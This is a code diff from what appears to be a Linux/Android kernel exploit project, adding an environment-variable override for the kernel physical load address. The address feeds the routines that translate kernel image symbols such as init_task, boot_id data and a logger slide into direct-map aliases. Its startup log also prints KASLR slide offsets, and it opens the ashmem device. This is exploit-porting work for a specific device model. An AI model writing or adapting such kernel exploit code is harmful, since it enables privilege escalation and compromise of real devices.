@@ -578,9 +578,9 @@ void log_startup_context(void) {
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
-             getpid(), (unsigned long long)P0_PHYS_OFFSET,
-             (unsigned long long)P0_KERNEL_PHYS_LOAD,
-             (unsigned long long)P0_KERNEL_PHYS_DELTA,
+              getpid(), (unsigned long long)P0_PHYS_OFFSET,
+              (unsigned long long)p0_kernel_phys_load(),
+              (unsigned long long)(p0_kernel_phys_load() - P0_PHYS_OFFSET),
              (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
              (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
              (unsigned long long)SLIDE_INIT_TASK,
@@ -674,14 +674,42 @@ int open_ashmem_device(void) {
   return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
 }
 
+/* S936W bringup diagnostic: P0_KERNEL_PHYS_LOAD override without rebuilding
+ * (env P0_KERNEL_PHYS_LOAD, hex accepted). Remove once confirmed. */
+static uintptr_t g_p0_phys_load = (uintptr_t)P0_KERNEL_PHYS_LOAD;
+
+uintptr_t p0_kernel_phys_load(void) {
+  return g_p0_phys_load;
+}
+
+void p0_phys_load_override_init(void) {
+  const char *value = getenv("P0_KERNEL_PHYS_LOAD");
+  if (!value || !*value) {
+    return;
+  }
+  char *end = NULL;
+  errno = 0;
+  unsigned long long parsed = strtoull(value, &end, 0);
+  if (errno || end == value || *end || !parsed ||
+      parsed > (unsigned long long)UINTPTR_MAX) {
+    pr_warning("ignoring invalid P0_KERNEL_PHYS_LOAD=%s\n", value);
+    return;
+  }
+  g_p0_phys_load = (uintptr_t)parsed;
+  pr_warning("diagnostic P0_KERNEL_PHYS_LOAD override=%08zx "
+             "compile_default=%08zx\n",
+             g_p0_phys_load, (size_t)P0_KERNEL_PHYS_LOAD);
+}
+
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
-  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
+  uintptr_t phys = p0_kernel_phys_load() + off;
   return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
+  return (data_alias - P0_PAGE_OFFSET) -
+         (p0_kernel_phys_load() - P0_PHYS_OFFSET);
 }
 
 uintptr_t data_direct_addr(uintptr_t image_addr) {
